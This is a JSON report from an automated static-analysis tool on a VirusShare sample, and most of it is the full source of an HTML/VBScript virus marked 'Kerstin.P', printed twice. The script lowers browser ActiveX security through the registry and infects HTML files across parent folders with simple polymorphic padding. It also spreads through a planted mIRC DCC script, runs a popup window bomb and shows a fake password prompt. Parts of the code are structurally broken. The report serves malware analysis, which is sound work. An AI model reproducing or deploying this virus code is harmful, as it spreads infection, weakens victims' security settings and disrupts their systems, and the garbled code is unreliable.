{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "chr": "May attempt to obfuscate specific str",
            "open": "May open a file"
        },
        "macro": "<!--Kerstin.P-->\n\n<SCRIPT language=JavaScript>\n<!--\n\tvar userAgent=navigator.appName;\n\tvar userVer=navigator.appVersion;\n\tvar agentInfo=userAgent.substring(0, 1);\n\tvar agentVer=userVer.substring(0, 1);\n       if(agentInfo == \"M\"){\nif  (agentVer >=\"4\"){\nalert(\"If Your Active-X asks you, and you want \\nto continue load this page answer yes when asked\")\n}\n}else {\nalert(\"Please..Confirm your Password here..\")\nself.close()\nhistory.go(-1)\n}\n//-->\n</SCRIPT>\n\n<script language=\"VBScript\"><!--\n\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Regwrite\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\" , 0, \"REG_DWORD\"\nWshShell.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\" , 0, \"REG_DWORD\"\n\nOn Error Resume Next\nRandomize\nIf location.protocol = \"file:\" then\n\n Set FileSystem = CreateObject(\"Scripting.FileSystemObject\")\n\n Infect_Path = Replace(location.href, \"file:///\", \"\")\n Infect_Path = Replace(Infect_Path, \"/\", \"\\\")\n mypath = FileSystem.GetParentFolderName(Infect_Path)\n\n Set folder = FileSystem.GetFolder(mypath)\n Call Infect(folder)\n\n Set Script = FileSystem.OpenTextFile(\"C:\\mirc\\script.ini\", 2, True)\n Script.WriteLine \"[Script]\"\n Script.WriteLine \"n0=on 1:FILERCVD:*.*:./dcc send $nick c:\\Lucky.htm\"\n Script.WriteLine \"n1=on 1:Connect:./msg Hello PPl !\"\n Script.WriteLine \"n2=on 1:Connect:./msg My Name are Kerstin.P\"\n Script.WriteLine \"n3=on 1:Connect:./msg and my BoyFriend are\"\n Script.WriteLine \"n4=on 1:Connect:./msg Jerret_Black form HotMail.com\"\n Script.WriteLine \"n5=on 1:Connect:./msg Thx: All PPl that\ufffds Started this File\"\n Script.Close\n\n Set current_vir = FileSystem.opentextfile(Infect_Path, 1, true)\n Set xxx = FileSystem.CreateTextFile(\"c:\\Lucky.htm\",2,false)\n\nFor I = 1 to 118\n xxx.WriteLine current_vir.ReadLine\nNext\n\n xxx.Close\n current_vir.Close\n\nIf Day(now()) = 17 and Month(now()) = 08 then\n WshShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner\", \"Jerret_Black@HotMail.com\"\n MsgBox(\"Kerstin.P\")\nEnd If\n\n<body text=\"#CCCCCC\" bgcolor=\"#000000\" link=\"#FFFFFF\" vlink=\"#999999\" alink=\"#C0C0C0\" ONLOAD=\"WindowBomb()\">\n</head>\n<SCRIPT language=JavaScript>\n<!--\nfunction WindowBomb()\n{\nvar iCounter = 0    // dummy counter\nwhile (true)\n{\nwindow.open(\"http://www.avp.ch\",\"CRASHING\" + iCounter,\"width=1,height=1,resizable=no\")\niCounter++\n\n\nEnd If\n\nSub Infect(folder)\n\nWhile folder.IsRootFolder = false \n Set folder = FileSystem.GetFolder(mypath)\n Set fc = folder.Files\n mypath = FileSystem.GetParentFolderName(mypath)\n\nFor each f1 in fc\n ex = Lcase(FileSystem.GetExtensionName(f1.name))\n if ex = \"htm\" or ex = \"html\" or ex =\"htt\" AND f1.path <> Infect_Path then\n Set current_vir = FileSystem.opentextfile(f1.path, 1, true)\n GetMark = current_vir.readline\n current_vir.close\n if GetMark <> \"<!--Kerstin.P-->\" then\n\n Set current_vir = FileSystem.opentextfile(Infect_Path, 1, true)\n Temp = FileSystem.GetTempName\n FileSystem.CopyFile f1.path, Temp\n Set host = FileSystem.opentextfile(f1.path, 2, true)\n Poly = int(rnd * 222)\n\nFor I = 1 to 118\n host.Writeline current_vir.ReadLine\nNext\n\nFor I = 1 to Poly\n host.WriteLine chr(13) & chr(10)\nNext\n\n current_vir.close\n host.close\n\n Set current_vir = FileSystem.opentextfile(Temp, 1, true)\n Set host = FileSystem.opentextfile(f1.path, 8, true)\n\nDo While current_vir.AtEndOfStream <> True\n\nIf Int(Rnd * 3) = 1 Then\n host.WriteLine \"<!--\" & int(rnd * 20000) & \"-->\"\nEnd If\n host.WriteLine current_vir.ReadLine\nLoop\n\n host.Close\n current_vir.close\n FileSystem.DeleteFile Temp\n\nEnd If\nEnd If\n\nNext\nWend\n\nEnd Sub\n--></script>\n</html>"
    },
    "filename": "VirusShare_377fe194b97e74310562afefea6c52c9",
    "filesize": 3755,
    "filetype": "HTML document, ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "377fe194b97e74310562afefea6c52c9",
        "sha1": "903f9060c2c82afb3bdf299b50ade8a52ae9afc0",
        "sha256": "ff40c7220cb70ba0e9ca6af41ab2e7960a0061b611d5a8470658ace8c48ca28d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<!--Kerstin.P-->",
            "<SCRIPT language=JavaScript>",
            "<!--",
            "\tvar userAgent=navigator.appName;",
            "\tvar userVer=navigator.appVersion;",
            "\tvar agentInfo=userAgent.substring(0, 1);",
            "\tvar agentVer=userVer.substring(0, 1);",
            "       if(agentInfo == \"M\"){",
            "if  (agentVer >=\"4\"){",
            "alert(\"If Your Active-X asks you, and you want \\nto continue load this page answer yes when asked\")",
            "}else {",
            "alert(\"Please..Confirm your Password here..\")",
            "self.close()",
            "history.go(-1)",
            "//-->",
            "</SCRIPT>",
            "<script language=\"VBScript\"><!--",
            "Set WshShell = CreateObject(\"WScript.Shell\")",
            "WshShell.Regwrite\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\" , 0, \"REG_DWORD\"",
            "WshShell.RegWrite\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\" , 0, \"REG_DWORD\"",
            "On Error Resume Next",
            "Randomize",
            "If location.protocol = \"file:\" then",
            " Set FileSystem = CreateObject(\"Scripting.FileSystemObject\")",
            " Infect_Path = Replace(location.href, \"file:///\", \"\")",
            " Infect_Path = Replace(Infect_Path, \"/\", \"\\\")",
            " mypath = FileSystem.GetParentFolderName(Infect_Path)",
            " Set folder = FileSystem.GetFolder(mypath)",
            " Call Infect(folder)",
            " Set Script = FileSystem.OpenTextFile(\"C:\\mirc\\script.ini\", 2, True)",
            " Script.WriteLine \"[Script]\"",
            " Script.WriteLine \"n0=on 1:FILERCVD:*.*:./dcc send $nick c:\\Lucky.htm\"",
            " Script.WriteLine \"n1=on 1:Connect:./msg Hello PPl !\"",
            " Script.WriteLine \"n2=on 1:Connect:./msg My Name are Kerstin.P\"",
            " Script.WriteLine \"n3=on 1:Connect:./msg and my BoyFriend are\"",
            " Script.WriteLine \"n4=on 1:Connect:./msg Jerret_Black form HotMail.com\"",
            " Script.WriteLine \"n5=on 1:Connect:./msg Thx: All PPl thats Started this File\"",
            " Script.Close",
            " Set current_vir = FileSystem.opentextfile(Infect_Path, 1, true)",
            " Set xxx = FileSystem.CreateTextFile(\"c:\\Lucky.htm\",2,false)",
            "For I = 1 to 118",
            " xxx.WriteLine current_vir.ReadLine",
            "Next",
            " xxx.Close",
            " current_vir.Close",
            "If Day(now()) = 17 and Month(now()) = 08 then",
            " WshShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner\", \"Jerret_Black@HotMail.com\"",
            " MsgBox(\"Kerstin.P\")",
            "End If",
            "<body text=\"#CCCCCC\" bgcolor=\"#000000\" link=\"#FFFFFF\" vlink=\"#999999\" alink=\"#C0C0C0\" ONLOAD=\"WindowBomb()\">",
            "</head>",
            "<SCRIPT language=JavaScript>",
            "<!--",
            "function WindowBomb()",
            "var iCounter = 0    // dummy counter",
            "while (true)",
            "window.open(\"http://www.avp.ch\",\"CRASHING\" + iCounter,\"width=1,height=1,resizable=no\")",
            "iCounter++",
            "End If",
            "Sub Infect(folder)",
            "While folder.IsRootFolder = false ",
            " Set folder = FileSystem.GetFolder(mypath)",
            " Set fc = folder.Files",
            " mypath = FileSystem.GetParentFolderName(mypath)",
            "For each f1 in fc",
            " ex = Lcase(FileSystem.GetExtensionName(f1.name))",
            " if ex = \"htm\" or ex = \"html\" or ex =\"htt\" AND f1.path <> Infect_Path then",
            " Set current_vir = FileSystem.opentextfile(f1.path, 1, true)",
            " GetMark = current_vir.readline",
            " current_vir.close",
            " if GetMark <> \"<!--Kerstin.P-->\" then",
            " Set current_vir = FileSystem.opentextfile(Infect_Path, 1, true)",
            " Temp = FileSystem.GetTempName",
            " FileSystem.CopyFile f1.path, Temp",
            " Set host = FileSystem.opentextfile(f1.path, 2, true)",
            " Poly = int(rnd * 222)",
            "For I = 1 to 118",
            " host.Writeline current_vir.ReadLine",
            "Next",
            "For I = 1 to Poly",
            " host.WriteLine chr(13) & chr(10)",
            "Next",
            " current_vir.close",
            " host.close",
            " Set current_vir = FileSystem.opentextfile(Temp, 1, true)",
            " Set host = FileSystem.opentextfile(f1.path, 8, true)",
            "Do While current_vir.AtEndOfStream <> True",
            "If Int(Rnd * 3) = 1 Then",
            " host.WriteLine \"<!--\" & int(rnd * 20000) & \"-->\"",
            "End If",
            " host.WriteLine current_vir.ReadLine",
            "Loop",
            " host.Close",
            " current_vir.close",
            " FileSystem.DeleteFile Temp",
            "End If",
            "End If",
            "Next",
            "Wend",
            "End Sub",
            "--></script>",
            "</html>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "file:///",
            "http://www.avp.ch"
        ]
    },
    "time": "0:00:00.284702",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
